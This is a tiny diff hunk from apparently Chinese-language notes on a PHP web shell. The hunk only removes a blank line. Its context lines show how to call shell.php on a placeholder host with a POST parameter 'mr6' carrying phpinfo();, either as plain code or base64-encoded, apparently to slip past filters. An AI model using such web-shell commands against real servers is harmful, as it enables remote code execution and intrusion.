@@ -15,7 +15,6 @@ http://www.xxx.com/shell.php
 POST: mr6=phpinfo();  //与普通shell相同
 
 http://www.xxx.com/shell.php?id=xxx(xxxx随便修改)
-
 POST: mr6=cGhwaW5mbygpOwo=  //payload的base64编码
 
 ```
